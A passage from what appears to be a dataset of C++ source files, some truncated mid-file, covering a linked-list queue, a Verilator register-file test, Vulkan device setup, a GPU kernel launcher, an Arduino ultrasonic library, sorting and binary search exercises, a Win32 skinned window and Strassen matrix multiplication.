node->next;\r\n    }\r\n    return node;\r\n}\r\nvoid LinkListQueue::printAll(){\r\n\tif(this->getBackNode() == NULL) return; //return NULL if list is empty    \r\n    QueueNode* node = this->getBackNode();// Go to the back of the queue\r\n    \r\n    while(node != NULL){\r\n\t\tcout <<\"[Key=\"<<node->key<<\" data=\"<<node->data<<\"] \";\r\n        node = node->next;\r\n    }\r\n\t\r\n}\r\n",
    "#include \"gtest/gtest.h\"\n#include <random>\n#include \"Vregfile.h\"\n\nclass RegfileTest : public ::testing::Test {\nprotected:\n    void TearDown() override { model->final(); }\n\n    std::shared_ptr<VerilatedContext> contextp = std::make_unique<VerilatedContext>();\n    std::shared_ptr<Vregfile> model = std::make_unique<Vregfile>(contextp.get());\n\n    void set_reg(int index, uint32_t value) {\n        model->A3 = index;\n        model->WE3 = 1;\n        model->D3 = value;\n        model->clk = 1;\n        model->eval();\n        model->clk = 0;\n        model->eval();\n        model->WE3 = 0;\n    }\n\n    uint32_t get_reg(int index) {\n        model->A1 = index;\n        model->clk = 0;\n        model->eval();\n        model->clk = 1;\n        model->eval();\n        return model->D1;\n    }\n};\n\nTEST_F(RegfileTest, ReadTest) {\n\n    model->A1 = 1;\n    model->A2 = 2;\n    model->eval();\n    EXPECT_EQ(0x0, model->D1) << \"D1 = \" << std::hex << model->D1 << std::dec;\n    EXPECT_EQ(0x0, model->D2) << \"D2 = \" << std::hex << model->D2 << std::dec;\n\n    model->A1 = 3;\n    model->A2 = 1;\n    model->eval();\n    EXPECT_EQ(0x0, model->D1) << \"D1 = \" << std::hex << model->D1 << std::dec;\n    EXPECT_EQ(0x0, model->D2) << \"D2 = \" << std::hex << model->D2 << std::dec;\n}\n\nTEST_F(RegfileTest, WriteTest) {\n    set_reg(1, 0xdeadbeef);\n    set_reg(2, 0xcafebebe);\n    set_reg(3, 0x12345678);\n\n    model->A1 = 1;\n    model->A2 = 2;\n    model->eval();\n    EXPECT_EQ(0xdeadbeef, model->D1) << \"D1 = \" << std::hex << model->D1 << std::dec;\n    EXPECT_EQ(0xcafebebe, model->D2) << \"D2 = \" << std::hex << model->D2 << std::dec;\n\n    model->A1 = 3;\n    model->A2 = 1;\n    model->eval();\n    EXPECT_EQ(0x12345678, model->D1) << \"D1 = \" << std::hex << model->D1 << std::dec;\n    EXPECT_EQ(0xdeadbeef, model->D2) << \"D2 = \" << std::hex << model->D2 << std::dec;\n}\n\nTEST_F(RegfileTest, SetGetTest) {\n    set_reg(1, 0xdeadbeef);\n    EXPECT_EQ(0xdeadbeef, get_reg( 1)) << \"D1 = \" << std::hex << get_reg( 1) << std::dec;\n}\n",
    "#include \"WannaVulkanDevice.h\"\n#include \"WannaVulkanContext.h\"\n#include \"WannaVulkanQueue.h\"\n\nnamespace WannaEngine {\n\n    // \u4ea4\u6362\u94fe\u62d3\u5c55\n    const DeviceFeature requestedExtensions[] = {\n        { VK_KHR_SWAPCHAIN_EXTENSION_NAME, true },\n#ifdef WANNA_ENGINE_PLATFORM_WIN32\n#elif WANNA_ENGINE_PLATFORM_MACOS\n        { \"VK_KHR_protability_subset\", true },\n#elif WANNA_ENGINE_PLATFORM_LINUX\n#endif\n    };\n\n    // \u6784\u9020\u51fd\u6570\n    WannaVulkanDevice::WannaVulkanDevice(WannaVulkanContext *context, uint32_t graphicQueueCount, uint32_t presentQueueCount, const WannaVulkanSetting &settings) \n        : mSettings(settings){\n        if (!context) {\n            LOG_ERROR(\"Must create a Vulkan graphic context before create device.\");\n            exit(EXIT_FAILURE);\n        }\n\n        // \u9519\u8bef\u5904\u7406 \u9632\u6b62\u961f\u5217\u6570\u91cf\u4e0d\u4e00\u81f4\n        QueueFamilyInfo graphicQueueInfo = context->GetGraphicQueueFamilyInfo();\n        QueueFamilyInfo presentQueueInfo = context->GetPresentQueueFamilyInfo();\n        if (graphicQueueCount > graphicQueueInfo.queueCount ) {\n            LOG_ERROR(\"This queue family has {0} queue, but request {1}\", graphicQueueInfo.queueCount, graphicQueueCount);\n            exit(EXIT_FAILURE);\n        }\n        if (presentQueueCount > presentQueueInfo.queueCount) {\n            LOG_ERROR(\"This queue family has {0} queue, but request {1}\", presentQueueInfo.queueCount, presentQueueCount);\n            exit(EXIT_FAILURE);\n        }\n\n        // \u961f\u5217\u4f18\u5148\u7ea7 \u663e\u793a\u961f\u5217\u4f18\u5148\u7ea7\u66f4\u9ad8\n        std::vector<float> graphicQueuePriorities(graphicQueueCount, 0.0f);\n        std::vector<float> presentQueuePriorities(presentQueueCount, 1.0f);\n\n        // \u5224\u65ad\u662f\u5426\u4e3a\u540c\u4e00\u961f\u5217\n        bool bSameQueueFamilyIndex = context->IsSameGraphicPresentQueueFamily();\n        // \u961f\u5217\u6570\u91cf\n        uint32_t sameQueueCount = graphicQueueCount;\n        if (bSameQueueFamilyIndex) {\n            sameQueueCount += presentQueueCount;\n            if (sameQueueCount > graphicQueueInfo.queueCount) {\n                sameQueueCount = graphicQueueInfo.queueCount;\n            }\n            graphicQueuePriorities.insert(graphicQueuePriorities.end(), presentQueuePriorities.begin(), presentQueuePriorities.end());\n        }\n\n        // \u663e\u793a\u961f\u5217\u4e0e\u56fe\u5f62\u961f\u5217\u4e00\u81f4\u65f6\u4f7f\u7528queueInfos[0]\n        VkDeviceQueueCreateInfo queueInfos[2] = {\n            {\n                .sType = VK_STRUCTURE_TYPE_DEVICE_QUEUE_CREATE_INFO,\n                .pNext = nullptr,\n                .flags = 0,\n                .queueFamilyIndex = static_cast<uint32_t>(graphicQueueInfo.queueFamilyIndex),\n                .queueCount = sameQueueCount,\n                .pQueuePriorities = graphicQueuePriorities.data(),\n            },\n        };\n\n        // \u663e\u793a\u961f\u5217\u4e0e\u56fe\u5f62\u961f\u5217\u4e0d\u4e00\u81f4\u65f6\u4f7f\u7528queueInfos[1]\n        if (!bSameQueueFamilyIndex) {\n            queueInfos[1] = {\n                .sType = VK_STRUCTURE_TYPE_DEVICE_QUEUE_CREATE_INFO,\n                .pNext = nullptr,\n                .flags = 0,\n                .queueFamilyIndex = static_cast<uint32_t>(presentQueueInfo.queueFamilyIndex),\n                .queueCount = presentQueueCount,\n                .pQueuePriorities = presentQueuePriorities.data(),\n            };\n        }\n\n        // \u62d3\u5c55\u6570\u91cf\u53ca\u540d\u79f0\n        uint32_t availableExtensionCount;\n        CALL_VK(vkEnumerateDeviceExtensionProperties(context->GetPhysicalDevice(), \"\", &availableExtensionCount, nullptr));\n        VkExtensionProperties availableExtensions[availableExtensionCount];\n        CALL_VK(vkEnumerateDeviceExtensionProperties(context->GetPhysicalDevice(), \"\", &availableExtensionCount, availableExtensions));\n        uint32_t enableExtensionCount;\n        const char *enableExtensions[32];\n        if(!findDeviceFeatures(\"Device Extension\", true, availableExtensionCount, availableExtensions,\n                                ARRAY_SIZE(requestedExtensions), requestedExtensions, &enableExtensionCount, enableExtensions)) {\n            exit(EXIT_FAILURE);\n        }\n\n        // \u903b\u8f91\u8bbe\u5907\u521b\u5efa\u4fe1\u606f\n        VkDeviceCreateInfo deviceInfo {\n            .sType = VK_STRUCTURE_TYPE_DEVICE_CREATE_INFO,\n            .pNext = nullptr,\n            .flags = 0,\n            .queueCreateInfoCount = static_cast<uint32_t>(bSameQueueFamilyIndex ? 1 : 2),\n            .pQueueCreateInfos = queueInfos,\n            .enabledLayerCount = 0,\n            .ppEnabledLayerNames = nullptr,\n            .enabledExtensionCount = enableExtensionCount,\n            .ppEnabledExtensionNames = enableExtensionCount > 0 ? enableExtensions : nullptr,\n            .pEnabledFeatures = nullptr\n        };\n        \n        CALL_VK(vkCreateDevice(context->GetPhysicalDevice(), &deviceInfo, nullptr, &mHandle));\n        LOG_INFO(\"VkDevice: {0}\", (void*)mHandle);\n\n        // \u83b7\u53d6\u6240\u6709\u56fe\u5f62\u961f\u5217\n        for (int i = 0; i < graphicQueueCount; i++) {\n            VkQueue queue;\n            vkGetDeviceQueue(mHandle, graphicQueueInfo.queueFamilyIndex, i, &queue);\n            mGraphicQueues.push_back(std::make_shared<WannaVulkanQueue>(graphicQueueInfo.queueFamilyIndex, i, queue, false));\n        }\n\n        // \u83b7\u53d6\u6240\u6709\u663e\u793a\u961f\u5217\n        for (int j = 0; j < presentQueueCount; j++) {\n            VkQueue queue;\n      ",
    "\ufeff#include <iostream>\n#include <memory>\n#include <Orochi/Orochi.h>\n#include \"shader.hpp\"\n#include \"typedbuffer.hpp\"\n\nint main() {\n\tif (oroInitialize((oroApi)(ORO_API_HIP | ORO_API_CUDA), 0))\n\t{\n\t\tprintf(\"failed to init..\\n\");\n\t\treturn 0;\n\t}\n\tint deviceIdx = 0;\n\n\toroError err;\n\terr = oroInit(0);\n\toroDevice device;\n\terr = oroDeviceGet(&device, deviceIdx);\n\toroCtx ctx;\n\terr = oroCtxCreate(&ctx, 0, device);\n\toroCtxSetCurrent(ctx);\n\n\toroStream stream = 0;\n\toroStreamCreate(&stream);\n\toroDeviceProp props;\n\toroGetDeviceProperties(&props, device);\n\n\tbool isNvidia = oroGetCurAPI(0) & ORO_API_CUDADRIVER;\n\n\tprintf(\"Device: %s\\n\", props.name);\n\tprintf(\"Cuda: %s\\n\", isNvidia ? \"Yes\" : \"No\");\n\n\tint blockDim = 32;\n\tint blocks = 4;\n\n\tTypedBuffer<int> buffer(TYPED_BUFFER_DEVICE);\n\tbuffer.allocate(blockDim * blocks);\n\n\t{\n\t\tstd::string baseDir = \"../\"; /* repository root */\n\n\t\tstd::vector<std::string> options;\n\t\toptions.push_back(\"-I\" + baseDir);\n\n\t\tif (isNvidia)\n\t\t{\n\t\t\toptions.push_back(\"--gpu-architecture=compute_70\");\n\t\t\toptions.push_back(NV_ARG_LINE_INFO);\n\t\t}\n\t\telse\n\t\t{\n\t\t\toptions.push_back(AMD_ARG_LINE_INFO);\n\t\t}\n\t\t// Debug\n\t\t//if( isNvidia )\n\t\t//{\n\t\t//\toptions.push_back(\"-G\");\n\t\t//}\n\t\t//else\n\t\t//{\n\t\t//\toptions.push_back(\"-O0\");\n\t\t//}\n\n\t\tShader shader((baseDir + \"\\\\kernel.cu\").c_str(), \"kernel.cu\", options );\n\n\t\tshader.launch(\"kernelMain\",\n\t\t\tShaderArgument().ptr(&buffer).value(4),\n\t\t\tblocks, 1, 1, blockDim, 1, 1, stream);\n\n\t\toroStreamSynchronize(stream);\n\t}\n\n\tTypedBuffer<int> outputs = buffer.toHost();\n\n\tfor (auto tid : outputs)\n\t{\n\t\tprintf(\"%d\\n\", tid);\n\t}\n\n\treturn 0;\n}\n",
    "// ---------------------------------------------------------------------------\r\n// Created by Tim Eckel - teckel@leethost.com\r\n// Copyright 2012 License: GNU GPL v3 http://www.gnu.org/licenses/gpl-3.0.html\r\n//\r\n// See \"NewPing.h\" for purpose, syntax, version history, links, and more.\r\n// ---------------------------------------------------------------------------\r\n\r\n#include \"NewPing.h\"\r\n\r\n\r\n// ---------------------------------------------------------------------------\r\n// NewPing constructor\r\n// ---------------------------------------------------------------------------\r\n\r\nNewPing::NewPing(uint8_t trigger_pin, uint8_t echo_pin, int max_cm_distance) {\r\n\t_triggerBit = digitalPinToBitMask(trigger_pin); // Get the port register bitmask for the trigger pin.\r\n\t_echoBit = digitalPinToBitMask(echo_pin);       // Get the port register bitmask for the echo pin.\r\n\r\n\t_triggerOutput = portOutputRegister(digitalPinToPort(trigger_pin)); // Get the output port register for the trigger pin.\r\n\t_echoInput = portInputRegister(digitalPinToPort(echo_pin));         // Get the input port register for the echo pin.\r\n\r\n\t_triggerMode = (uint8_t *) portModeRegister(digitalPinToPort(trigger_pin)); // Get the port mode register for the trigger pin.\r\n\r\n\t_maxEchoTime = min(max_cm_distance, MAX_SENSOR_DISTANCE) * US_ROUNDTRIP_CM + (US_ROUNDTRIP_CM / 2); // Calculate the maximum distance in uS.\r\n\r\n#if DISABLE_ONE_PIN == true\r\n\t*_triggerMode |= _triggerBit; // Set trigger pin to output.\r\n#endif\r\n}\r\n\r\n\r\n// ---------------------------------------------------------------------------\r\n// Standard ping methods\r\n// ---------------------------------------------------------------------------\r\n\r\nunsigned int NewPing::ping() {\r\n\tif (!ping_trigger()) return NO_ECHO;                // Trigger a ping, if it returns false, return NO_ECHO to the calling function.\r\n\twhile (*_echoInput & _echoBit)                      // Wait for the ping echo.\r\n\t\tif (micros() > _max_time) return NO_ECHO;       // Stop the loop and return NO_ECHO (false) if we're beyond the set maximum distance.\r\n\treturn (micros() - (_max_time - _maxEchoTime) - 5); // Calculate ping time, 5uS of overhead.\r\n}\r\n\r\n\r\nunsigned int NewPing::ping_in() {\r\n\tunsigned int echoTime = NewPing::ping();          // Calls the ping method and returns with the ping echo distance in uS.\r\n\treturn NewPingConvert(echoTime, US_ROUNDTRIP_IN); // Convert uS to inches.\r\n}\r\n\r\n\r\nunsigned int NewPing::ping_cm() {\r\n\tunsigned int echoTime = NewPing::ping();          // Calls the ping method and returns with the ping echo distance in uS.\r\n\treturn NewPingConvert(echoTime, US_ROUNDTRIP_CM); // Convert uS to centimeters.\r\n}\r\n\r\n\r\nunsigned int NewPing::ping_median(uint8_t it) {\r\n\tunsigned int uS[it], last;\r\n\tuint8_t j, i = 0;\r\n\tuS[0] = NO_ECHO;\r\n\twhile (i < it) {\r\n\t\tlast = ping();           // Send ping.\r\n\t\tif (last == NO_ECHO) {   // Ping out of range.\r\n\t\t\tit--;                // Skip, don't include as part of median.\r\n\t\t\tlast = _maxEchoTime; // Adjust \"last\" variable so delay is correct length.\r\n\t\t} else {                       // Ping in range, include as part of median.\r\n\t\t\tif (i > 0) {               // Don't start sort till second ping.\r\n\t\t\t\tfor (j = i; j > 0 && uS[j - 1] < last; j--) // Insertion sort loop.\r\n\t\t\t\t\tuS[j] = uS[j - 1]; // Shift ping array to correct position for sort insertion.\r\n\t\t\t} else j = 0;              // First ping is starting point for sort.\r\n\t\t\tuS[j] = last;              // Add last ping to array in sorted position.\r\n\t\t\ti++;                       // Move to next ping.\r\n\t\t}\r\n\t\tif (i < it) delay(PING_MEDIAN_DELAY - (last >> 10)); // Millisecond delay between pings.\r\n\t}\r\n\treturn (uS[it >> 1]); // Return the ping distance median.\r\n}\r\n\r\n\r\n// ---------------------------------------------------------------------------\r\n// Standard ping method support functions (not called directly)\r\n// ---------------------------------------------------------------------------\r\n\r\nboolean NewPing::ping_trigger() {\r\n#if DISABLE_ONE_PIN != true\r\n\t*_triggerMode |= _triggerBit;    // Set trigger pin to output.\r\n#endif\r\n\t*_triggerOutput &= ~_triggerBit; // Set the trigger pin low, should already be low, but this will make sure it is.\r\n\tdelayMicroseconds(4);            // Wait for pin to go low, testing shows it needs 4uS to work every time.\r\n\t*_triggerOutput |= _triggerBit;  // Set trigger pin high, this tells the sensor to send out a ping.\r\n\tdelayMicroseconds(10);           // Wait long enough for the sensor to realize the trigger pin is high. Sensor specs say to wait 10uS.\r\n\t*_triggerOutput &= ~_triggerBit; // Set trigger pin back to low.\r\n#if DISABLE_ONE_PIN != true\r\n\t*_triggerMode &= ~_triggerBit;   // Set trigger pin to input (when using one Arduino pin this is technically setting the echo pin to input as both are tied to the same Arduino pin).\r\n#endif\r\n\r\n\t_max_time =  micros() + MAX_SENSOR_DELAY;                  // Set a timeout for the ping to trigger.\r\n\twhile (*_echoInput & _echoBit && micros() <= _max_time) {} // Wait f",
    "#include <iostream>\n\nusing namespace std;\n\nint main()\n{\n\n    int n ;\n\n    cout << \"Enter the elemnets number you want to insert : \" ;\n\n    cin >> n;\n\n    cout << \"Enter the elements :\" ;\n\n    int arr[n];\n\n    for(int i  = 0 ; i < n ; i++)\n    {\n        cin >> arr[i];\n\n    }\n\n    int pass ;\n\n    int N = n;\n\n    int k;\n\n\n\n    for(pass = 0 ; pass < n-1 ; pass++)\n    {\n        for(int i = 0 ; i < N-1; i++  )\n        {\n\n\n            if(arr[i] > arr[i+1])\n            {\n                k = arr[i];\n                arr[i] = arr[i+1];\n                arr[i+1] = k;\n            }\n\n\n        }\n\n        --N;\n    }\n\n    cout << \"Sorted array is : \" << endl;\n\n    for(int i = 0 ; i < n ; i ++  )\n    {\n\n        cout << arr[i] << \" \";\n\n    }\n\n\n    cout << endl;\n\n\n    int value ;\n\n    cout << \"Enter the number you want to search :\" ;\n\n    cin >> value ;\n\n    int first = 0 ;\n\n    int last = n-1;\n\n    int middle = 0 ;\n\n\n while(true)\n {\n     middle = (first+last)/2;\n\n\n    if(first > last )\n    {\n        cout << \"Not found\" << endl;\n        break;\n    }\n     else if(arr[middle] == value )\n     {\n         cout << \"Found at index :\" <<middle<< endl;\n         break;\n     }\n\n     else if(arr[middle] < value )\n     {\n         first = middle+1;\n     }\n\n     else if(arr[middle] > value )\n     {\n         last = middle -1;\n     }\n\n\n\n }\n\n\n    return 0;\n}\n",
    "#include<iostream>\n#include<vector>\n#include \"./704_trial01.cpp\"\n\nint main(){\n    Solution s;\n\n    std::vector<int> vec1 {-1,0,3,5,9,12};\n    int target1 = 9;\n\n    std::cout << \"Example 1 - \" << std::endl;\n    for(size_t i = 0; i < vec1.size(); i++)\n        std::cout << vec1[i] << \"\\t\";\n    std::cout << std::endl;\n    std::cout << \"The value \" << target1 << \" is at position \" << s.search(vec1, target1) << std::endl;\n\n    std::cout << \"\\n--------\\n\" << std::endl;\n\n    std::vector<int> vec2 {-1,0,3,5,9,12};\n    int target2 = 2;\n\n    std::cout << \"Example 2 - \" << std::endl;\n    for(size_t i = 0; i < vec2.size(); i++)\n        std::cout << vec2[i] << \"\\t\";\n    std::cout << std::endl;\n    std::cout << \"The value \" << target2 << \" is at position \" << s.search(vec2, target2) << std::endl;\n\n    std::cout << \"\\n--------\\n\" << std::endl;\n\n    // this testcase find out that I am using size_t as counter\n    // but size_t cannot meet array size requirement\n    // so I need to use int\n\n    std::vector<int> vec3 {5};\n    int target3 = -5;\n\n    std::cout << \"Example 3 - \" << std::endl;\n    for(size_t i = 0; i < vec3.size(); i++)\n        std::cout << vec3[i] << \"\\t\";\n    std::cout << std::endl;\n    std::cout << \"The value \" << target3 << \" is at position \" << s.search(vec2, target2) << std::endl;\n \n    return 0;\n}\n",
    "#include \"StdAfx.h\"\n\n#ifdef _DEBUG\nvoid DebugOut(const TCHAR* fmt, ...) {\n    static TCHAR buffer[1024];\n\tmemset((void *) buffer, 0, sizeof(buffer));\n    va_list args;\n    va_start(args, fmt);\n    _vsntprintf(buffer, sizeof(buffer), fmt, args);\n    va_end(args);\n    OutputDebugString(buffer);\n}\n// Usage\n// DebugOut(\"This is a debug message: %d\\n\", 123);\n#else\nvoid DebugOut(const char* fmt, ...) {\n\treturn;\n}\n#endif\n\nCSkinWindow::CSkinWindow(void) {\n\tIsActive = FALSE;\n}\n\nCSkinWindow::~CSkinWindow(void) {\n\t//release resource\n\tFreeBitmap();\n\tif(WindowText) {\n\t\tfree(WindowText);\n\t\tWindowText = NULL;\n\t}\n\n\tif(m_MemDC) DeleteDC(m_MemDC);\n\tif(m_SkinDC) DeleteDC(m_SkinDC);\n\tif(m_RegionDC) DeleteDC(m_RegionDC);\n\tif(m_hFont) DeleteObject(m_hFont);\n}\n\nvoid CSkinWindow::Load(HINSTANCE hInst, HWND hWnd) {\n\tm_hInst = hInst;\n\tm_hWnd = hWnd;\n\n\tHDC WindowDC = GetWindowDC(hWnd);\n\tif(!m_MemDC) m_MemDC = CreateCompatibleDC(WindowDC);\n\tif(!m_SkinDC) m_SkinDC = CreateCompatibleDC(WindowDC);\n\tif(!m_RegionDC) m_RegionDC = CreateCompatibleDC(WindowDC);\n\n\t//create font\n\tif(!m_hFont) {\n\t\t_TCHAR sFontFace[] = _TEXT(\"Trebuchet MS\");\n\n\t\tLOGFONT lf;\n\t\tZeroMemory( &lf, sizeof(lf) );\n\t\tlf.lfHeight\t\t\t= 20;\n\t\tlf.lfWeight\t\t\t= FW_BOLD;\n\t\tlf.lfCharSet\t\t= DEFAULT_CHARSET;\n\t\tlf.lfQuality\t\t= DEFAULT_QUALITY;\n\t\tlf.lfOutPrecision\t= OUT_DEFAULT_PRECIS;\n\t\tlf.lfClipPrecision\t= CLIP_DEFAULT_PRECIS;\n\t\tlf.lfPitchAndFamily\t= DEFAULT_PITCH|FF_DONTCARE;\n\t\t_tcscpy( lf.lfFaceName, sFontFace );\n\n\t\tm_hFont = CreateFontIndirect(&lf);\n\t}\n\n\t//1 load bitmap from resource\n\tLoadBitmapFromResource();\n\n\t//2 calculate resource's information\n\tCalcResourceInfo();\n\n\t//3 config current window's style\n\tDWORD style = GetWindowLong( m_hWnd, GWL_STYLE );\n\tm_sizable = style & WS_SIZEBOX;\n\tm_minable = style & WS_MINIMIZEBOX;\n\tm_maxable = style & WS_MAXIMIZEBOX;\n\tstyle &= ~(WS_MINIMIZEBOX);\n\tstyle &= ~WS_MAXIMIZEBOX;\n\tstyle &= ~WS_SYSMENU;\n\tSetWindowLong( m_hWnd, GWL_STYLE, style );\n}\n\nvoid CSkinWindow::CalcResourceInfo() {\n\t//bitmap's information\n\tGetObject(m_hLeftBmp, sizeof(BITMAP), &bmpLeft);\n\tGetObject(m_hTopBmp, sizeof(BITMAP), &bmpTop);\n\tGetObject(m_hRightBmp, sizeof(BITMAP), &bmpRight);\n\tGetObject(m_hBottomBmp, sizeof(BITMAP), &bmpBottom);\n\tGetObject(m_hMinBtnBmp, sizeof(BITMAP), &bmpMinBtn);\n\tGetObject(m_hMaxBtnBmp, sizeof(BITMAP), &bmpMaxBtn);\n\tGetObject(m_hRestoreBtnBmp, sizeof(BITMAP), &bmpRestoreBtn);\n\tGetObject(m_hCloseBtnBmp, sizeof(BITMAP), &bmpCloseBtn);\n\n\tBorderLeftWidth = bmpLeft.bmWidth / 2;\n\tBorderRightWidth = bmpRight.bmWidth / 2;\n\tBorderTopHeight = bmpTop.bmHeight / 2;\n\tBorderBottomHeight = bmpBottom.bmHeight / 2;\n\n\tTopOffset1 = 40;\n\tTopOffset2 = bmpTop.bmWidth - 60;\n\tif(TopOffset2 <= TopOffset1)\n\t\tTopOffset2 = TopOffset1 + 1;\n\n\tLeftOffset1 = 29;\n\tLeftOffset2 = bmpLeft.bmHeight - LeftOffset1;\n\tif(LeftOffset2 <= LeftOffset1)\n\t\tLeftOffset2 = LeftOffset1 + 1;\n\n\tRightOffset1 = 29;\n\tRightOffset2 = bmpRight.bmHeight - RightOffset1;\n\tif(RightOffset2 <= RightOffset1)\n\t\tRightOffset2 = RightOffset1 + 1;\n\n\tBottomOffset1 = 0;\n\tBottomOffset2 = bmpBottom.bmWidth - 0;\n\tif(BottomOffset2 <= BottomOffset1)\n\t\tBottomOffset2 = BottomOffset1 + 1;\n\n\tclrTrans = RGB(255, 0, 255);\n\tIsActive = FALSE;\n\tm_bTrans = TRUE;\n\n\t//caption button's position\n\tSetRect(&minBtnRect, 74-bmpMinBtn.bmWidth/4, 4, 74, 4+bmpMinBtn.bmHeight);\n\tSetRect(&maxBtnRect, 50-bmpMaxBtn.bmWidth/4, 4, 50, 4+bmpMaxBtn.bmHeight);\n\tSetRect(&restoreBtnRect, 50-bmpRestoreBtn.bmWidth/4, 4, 50, 4+bmpRestoreBtn.bmHeight);\n\tSetRect(&closeBtnRect, 27-bmpCloseBtn.bmWidth/4, 4, 27, 4+bmpCloseBtn.bmHeight);\n}\n\nvoid CSkinWindow::LoadBitmapFromResource() {\n\tif(!m_hInst) return;\n\n\tm_hLeftBmp = LoadBitmap(m_hInst, MAKEINTRESOURCE(IDB_LEFT));\n\tm_hTopBmp = LoadBitmap(m_hInst, MAKEINTRESOURCE(IDB_TOP));\n\tm_hRightBmp = LoadBitmap(m_hInst, MAKEINTRESOURCE(IDB_RIGHT));\n\tm_hBottomBmp = LoadBitmap(m_hInst, MAKEINTRESOURCE(IDB_BOTTOM));\n\n\tm_hMinBtnBmp = LoadBitmap(m_hInst, MAKEINTRESOURCE(IDB_MIN));\n\tm_hMaxBtnBmp = LoadBitmap(m_hInst, MAKEINTRESOURCE(IDB_MAX));\n\tm_hRestoreBtnBmp = LoadBitmap(m_hInst, MAKEINTRESOURCE(IDB_RESTORE));\n\tm_hCloseBtnBmp = LoadBitmap(m_hInst, MAKEINTRESOURCE(IDB_CLOSE));\n\n\tm_Loaded = TRUE;\n}\n\nvoid CSkinWindow::FreeBitmap() {\n\tDeleteObject(m_hLeftBmp);\n\tDeleteObject(m_hTopBmp);\n\tDeleteObject(m_hRightBmp);\n\tDeleteObject(m_hBottomBmp);\n\tDeleteObject(m_hMinBtnBmp);\n\tDeleteObject(m_hMaxBtnBmp);\n\tDeleteObject(m_hRestoreBtnBmp);\n\tDeleteObject(m_hCloseBtnBmp);\n\n\tDeleteObject(m_hBtnMemBmp);\n\tDeleteObject(m_hBtnMaskBmp);\n\tDeleteObject(m_MemBitmap);\n\n\tm_Loaded = FALSE;\n}\n\nvoid CSkinWindow::Free() {\n\t//release resource\n\tFreeBitmap();\n\tif(WindowText) {\n\t\tfree(WindowText);\n\t\tWindowText = NULL;\n\t}\n\n\tif(m_MemDC) DeleteDC(m_MemDC);\n\tif(m_SkinDC) DeleteDC(m_SkinDC);\n\tif(m_RegionDC) DeleteDC(m_RegionDC);\n\n\tif(m_hFont) DeleteObject(m_hFont);\n}\n\nBOOL CSkinWindow::IsHandledMessage(UINT message) {\n\tfor(int i=0;i<MESSAGE_COUNT;i++) {\n\t\tif(HANDLED_MESSAGE[i] == message)\n\t\t\treturn TRUE;\n\t}\n\n\treturn FALSE;\n}\n\nLRESULT CSkinWindow::WndProc(HWND hW",
    "// Primero genere las matrices A y B con los datos de entrada. Use el algoritmo de Strassen. Este divide las matrices en cuadrantes y \n// realiza 7 multiplicaciones recursivas. Para implementarlo use funciones para sumar y restar matrices. Estas me permitieron calcular \n// las 7 multiplicaciones eficientemente. Adem\u00e1s, use funciones para dividir a la matriz en cuadrantes y unir los cuadrantes en una \n// matriz. Estas son necesarias para la recursividad del algoritmo. La funci\u00f3n de divisi\u00f3n me permiti\u00f3 dividir las matrices en \n// submatrices m\u00e1s peque\u00f1as, mientras que la funci\u00f3n de uni\u00f3n me permiti\u00f3 combinar las submatrices resultantes en la matriz final. \n// Finalmente, calcul\u00e9 el vector V a partir de la matriz C.\n#include <vector>\n#include <iostream>\n\nusing namespace std;\n\nvector<vector<uint64_t>> add(vector<vector<uint64_t>> A, vector<vector<uint64_t>> B) {\n    int n = A.size();\n    vector<vector<uint64_t>> C(n, vector<uint64_t>(n));\n    for (int i = 0; i < n; i++)\n        for (int j = 0; j < n; j++)\n            C[i][j] = A[i][j] + B[i][j];\n    return C;\n}\n\nvector<vector<uint64_t>> sub(vector<vector<uint64_t>> A, vector<vector<uint64_t>> B) {\n    int n = A.size();\n    vector<vector<uint64_t>> C(n, vector<uint64_t>(n));\n    for (int i = 0; i < n; i++)\n        for (int j = 0; j < n; j++)\n            C[i][j] = A[i][j] - B[i][j];\n    return C;\n}\n\nvoid split(vector<vector<uint64_t>>& cd, vector<vector<uint64_t>>& gc, size_t iB, size_t jB) {\n    for(size_t i1 = 0, i2 = iB; i1 < gc.size(); i1++, i2++)\n        for(size_t j1 = 0, j2 = jB; j1 < gc.size(); j1++, j2++)\n            gc[i1][j1] = cd[i2][j2];\n}\n\nvoid join(vector<vector<uint64_t>>& gc, vector<vector<uint64_t>>& cd, size_t iB, size_t jB) {\n    for(size_t i1 = 0, i2 = iB; i1 < gc.size(); i1++, i2++)\n        for(size_t j1 = 0, j2 = jB; j1 < gc.size(); j1++, j2++)\n            cd[i2][j2] = gc[i1][j1];\n}\n\nvector<vector<uint64_t>> strassen(vector<vector<uint64_t>> A, vector<vector<uint64_t>> B) {\n    int n = A.size();\n\n    if (n == 1) {\n        vector<vector<uint64_t>> C(1, vector<uint64_t>(1));\n        C[0][0] = A[0][0] * B[0][0];\n        return C;\n    }\n\n    int newSize = n / 2;\n    vector<vector<uint64_t>> a11(newSize, vector<uint64_t>(newSize)), a12(newSize, vector<uint64_t>(newSize)), a21(newSize, vector<uint64_t>(newSize)), a22(newSize, vector<uint64_t>(newSize));\n    vector<vector<uint64_t>> b11(newSize, vector<uint64_t>(newSize)), b12(newSize, vector<uint64_t>(newSize)), b21(newSize, vector<uint64_t>(newSize)), b22(newSize, vector<uint64_t>(newSize));\n\n    split(A, a11, 0 , 0); split(A, a12, 0 , newSize); split(A, a21, newSize, 0); split(A, a22, newSize, newSize);\n    split(B, b11, 0 , 0); split(B, b12, 0 , newSize); split(B, b21, newSize, 0); split(B, b22, newSize, newSize);\n\n    vector<vector<uint64_t>> p1 = strassen(add(a11, a22), add(b11, b22));\n    vector<vector<uint64_t>> p2 = strassen(add(a21, a22), b11);\n    vector<vector<uint64_t>> p3 = strassen(a11, sub(b12, b22));\n    vector<vector<uint64_t>> p4 = strassen(a22, sub(b21, b11));\n    vector<vector<uint64_t>> p5 = strassen(add(a11, a12), b22);\n    vector<vector<uint64_t>> p6 = strassen(sub(a21, a11), add(b11, b12));\n    vector<vector<uint64_t>> p7 = strassen(sub(a12, a22), add(b21, b22));\n\n    vector<vector<uint64_t>> c11 = add(sub(add(p1, p4), p5), p7);\n    vector<vector<uint64_t>> c12 = add(p3, p5);\n    vector<vector<uint64_t>> c21 = add(p2, p4);\n    vector<vector<uint64_t>> c22 = add(sub(add(p1, p3), p2), p6);\n\n    vector<vector<uint64_t>> C(n, vector<uint64_t>(n));\n    join(c11, C, 0 , 0); join(c12, C, 0 , newSize); join(c21, C, newSize, 0); join(c22, C, newSize, newSize);\n\n    return C;\n}\n\nint main() {\n    uint32_t n, i, j, d1, p1, r1, m1, d2, p2, r2, m2;\n    cin >> n >> p1 >> d1 >> r1 >> m1 >> p2 >> d2 >> r2 >> m2;\n    vector< vector<uint64_t> > A(n, vector<uint64_t>(n)), B(n, vector<uint64_t>(n));\n    vector< 